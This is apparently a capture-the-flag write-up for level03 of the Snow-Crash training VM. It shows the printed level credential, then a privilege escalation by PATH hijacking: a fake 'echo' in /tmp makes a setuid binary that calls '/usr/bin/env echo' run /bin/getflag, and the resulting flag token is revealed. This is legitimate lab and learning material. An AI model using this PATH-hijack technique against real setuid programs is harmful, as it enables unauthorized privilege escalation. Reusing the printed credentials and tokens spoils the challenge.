# Flag 03

- Access to Snow-Crash VM using level03/kooda2puivaav1idi4f57q8iq credential
```
e1r9p7% ssh -p 4242 level03@10.11.100.146
```

- `ll`
```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
```

- Try to run the binary
```
level03@SnowCrash:~$ ./level03 
Exploit me
```

- Try te read it wth Strings
```
[^_]
/usr/bin/env echo Exploit me
;*2$"
```

- Do Some searchs in google:
```
https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code/8304447
```

- So the vulnerable in this binary is:
> I can override `PATH` var to redirect to my own `echo`, because `echo` is executed using `enn` not treated as built-in.

- I will create my own `echo` to exec `/bin/getflag` and add it to `PATH`
```
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ PATH=/tmp:$PATH
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```